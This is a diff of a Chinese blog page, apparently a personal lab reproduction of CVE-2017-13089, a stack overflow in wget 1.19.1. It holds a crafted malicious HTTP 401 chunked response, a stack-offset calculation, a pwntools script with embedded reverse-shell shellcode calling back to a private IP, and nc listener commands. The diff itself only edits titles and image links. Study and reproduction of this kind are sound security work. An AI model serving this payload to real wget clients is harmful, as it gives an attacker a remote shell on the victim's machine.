@@ -19,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>cve-2017-13089 wget栈溢出漏洞复现 - 虽然没什么用但还是想记下来</title>
+  <title>cve-2017-13089 wget栈溢出 - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -384,7 +384,7 @@
     
     
       <h1 class="title">
-        cve-2017-13089 wget栈溢出漏洞复现
+        cve-2017-13089 wget栈溢出
       </h1>
       <div class='new-meta-box'>
         
@@ -401,6 +401,13 @@
         
           
             
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </a>
+  </div>
+
 
           
         
@@ -419,7 +426,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="cve-2017-13089 wget栈溢出漏洞复现" data-path="/2021/03/24/wget%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+      <div id="lc-pv" data-title="cve-2017-13089 wget栈溢出" data-path="/2021/03/24/wget%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -437,7 +444,7 @@
 
   
   <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1、<strong>Ubuntu 16.04 64bit</strong></p>
-<p>![DB091FB7-51AD-4B0E-8DF8-03702EEB212F](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DB091FB7-51AD-4B0E-8DF8-03702EEB212F.png)</p>
+<p><img src="/images/pasted-275.png" class="lazyload" data-srcset="/images/pasted-275.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>2、<strong>wget .19.1</strong></p>
 <h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>建立好poc文件之后，端口监听</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">9799</span> &lt; poc2</span><br></pre></td></tr></table></figure>
@@ -445,7 +452,7 @@
 <p>另一个窗口执行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wget <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9799</span></span><br></pre></td></tr></table></figure>
 
-<p>![67F82420-F331-4EBE-BDCA-9F8F4DEDDA10](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/67F82420-F331-4EBE-BDCA-9F8F4DEDDA10.png)</p>
+<p><img src="/images/pasted-276.png" class="lazyload" data-srcset="/images/pasted-276.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>代码结构大致如下</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.c&#123;</span><br><span class="line">  ...</span><br><span class="line">  statcode == <span class="number">401</span>&#123;</span><br><span class="line">    ---&gt; skip_short_body(sock, contlen, chunked_transfer_encoding) ---&gt;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -468,22 +475,19 @@
 <p>同时另一个窗口</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">9799</span> &lt; poc</span><br></pre></td></tr></table></figure>
 
-
-
-<p>![DBCF7AE8-B3EE-4889-BB2A-B2861A543A94](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DBCF7AE8-B3EE-4889-BB2A-B2861A543A94.png)</p>
+<p><img src="/images/pasted-277.png" class="lazyload" data-srcset="/images/pasted-277.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>strol函数，传递的参数如下：</p>
-<p>![DD01E276-05B9-4495-8A0D-5ED9A88988F2](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DD01E276-05B9-4495-8A0D-5ED9A88988F2.png)</p>
+<p><img src="/images/pasted-278.png" class="lazyload" data-srcset="/images/pasted-278.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>调用fd_read的时候，往第二个参数0x7fffffffd140内写入传输到内容，即AAAA……</p>
-<p>![0560E40D-88C9-4F39-9107-0152E8020513](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/0560E40D-88C9-4F39-9107-0152E8020513.png)</p>
-<p>然后返回到skip_short_body函数。为了方便后续的利用，需要计算栈偏移</p>
+<p><img src="/images/pasted-279.png" class="lazyload" data-srcset="/images/pasted-279.png" srcset="data:image/png;base64,666" alt="upload successful"><br>然后返回到skip_short_body函数。为了方便后续的利用，需要计算栈偏移</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fffffffd140</span> $rbp+<span class="number">8</span></span><br><span class="line">0x7fffffffd140-&gt;0x7fffffffd378 is 0x238 bytes (0x47 words)</span><br><span class="line"></span><br><span class="line"><span class="number">0x238</span> = <span class="number">568</span></span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>需要先关闭栈保护，然后重新编译。</p>
-<p>![E11F40C8-083E-48F6-B13D-8680D2C6B94B](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/E11F40C8-083E-48F6-B13D-8680D2C6B94B.png)</p>
+<p><img src="/images/pasted-280.png" class="lazyload" data-srcset="/images/pasted-280.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>生成shellcode，ifconfig查看ip，-f c表示是C语言格式的</p>
-<p>![image-20210326131337229](/Users/my/Library/Application Support/typora-user-images/image-20210326131337229.png)</p>
+<p><img src="/images/pasted-281.png" class="lazyload" data-srcset="/images/pasted-281.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1 401 Not Authorized</span></span><br><span class="line"><span class="string">Content-Type: text/plain; charset=UTF-8</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-0xFFFFF000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">port = p64(<span class="number">6324</span>).replace(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[::<span class="number">-1</span>]</span><br><span class="line">sc = <span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x18\xb4\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload += sc + (<span class="number">568</span>-len(sc))*<span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="comment">#payload += &quot;\xd0\xd8\xff\xff\xff\x7f\x00\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x7fffffffd140</span>)</span><br><span class="line">payload += <span class="string">&quot;\n0\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;exp1&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -506,7 +510,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A窗口 监听端口</span></span><br><span class="line">nc -nvlp <span class="number">6789</span> &lt; zzz</span><br><span class="line"></span><br><span class="line"><span class="comment">#B窗口 调试</span></span><br><span class="line">set args <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6789</span></span><br><span class="line">b skip_short_body</span><br><span class="line">b *<span class="number">0x000000000041f18d</span></span><br></pre></td></tr></table></figure>
 
 <p>此时写的地址变成了0xfd190，所以需要把上面的payload的返回地址改成0x190。</p>
-<p>需要纠正两个点</p>
+<p>⚠️需要纠正两个点</p>
 <p>利用过程主要分为两步，触发漏洞和反弹端口</p>
 <p>(1)触发漏洞：窗口A通过nc开启一个端口6788，B进行调试，连接到这个端口，触发漏洞，执行shellcode。</p>
 <p>(2)反弹shell，shellcode的作用是反弹shell，反弹的端口是在生成木马的时候指定的，此处设置的是6789，C窗口监听6789端口。</p>
@@ -516,9 +520,9 @@
 
 
 <p>执行完shellcode之后，显示如下</p>
-<p>![A4AC9F7D-B4C3-461D-BDA7-70EFA2A17715](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/A4AC9F7D-B4C3-461D-BDA7-70EFA2A17715.png)</p>
+<p><img src="/images/pasted-282.png" class="lazyload" data-srcset="/images/pasted-282.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>在B窗口 disable 1，取消断点，然后c</p>
-<p>![B6F04B08-192A-4E7F-8BDC-5309C9E95614](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/B6F04B08-192A-4E7F-8BDC-5309C9E95614.png)</p>
+<p><img src="/images/pasted-283.png" class="lazyload" data-srcset="/images/pasted-283.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>收获：</p>
 <p>1、自己基础太差，卡在那里是因为nc的用法、反弹shell 不清楚</p>
 <p>2、适当参考网上的文章，可能有不适用的地方甚至有错误</p>
@@ -540,6 +544,11 @@
 
   
     <div class="prev-next">
+      
+        <a class='prev' href='/2021/03/27/easyconnect%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>connect命令执行漏洞</p>
+          <p class='content'>mac版下载地址 http://download.sangfor.com.cn/download/product/sslvpn/pkg/mac_ec_sp/EasyConnect.dmg 版本：...</p>
+        </a>
       
       
         <a class='next' href='/2021/03/16/%E4%BD%BF%E7%94%A8DNS%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8DAPT%E6%94%BB%E5%87%BB%E4%B8%AD%E5%8F%97%E6%84%9F%E6%9F%93%E7%9A%84%E4%B8%BB%E6%9C%BA/'>
